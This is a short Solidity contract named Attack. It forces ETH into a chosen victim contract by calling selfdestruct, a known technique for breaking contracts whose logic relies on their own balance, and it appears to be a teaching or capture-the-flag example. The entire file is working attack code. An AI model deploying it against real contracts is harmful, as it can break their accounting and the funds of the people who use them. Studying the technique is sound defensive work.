// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
  address victimContract;
  
  constructor(address _victimContract) payable {
    victimContract = _victimContract;
  }

  function attack() external {
    require(address(this).balance > 0, "Jackass, the Attacker contract has no ETH to perform the attack");
    // Forcebly inject ETH on the victim contract
    selfdestruct(payable(victimContract));
  }
}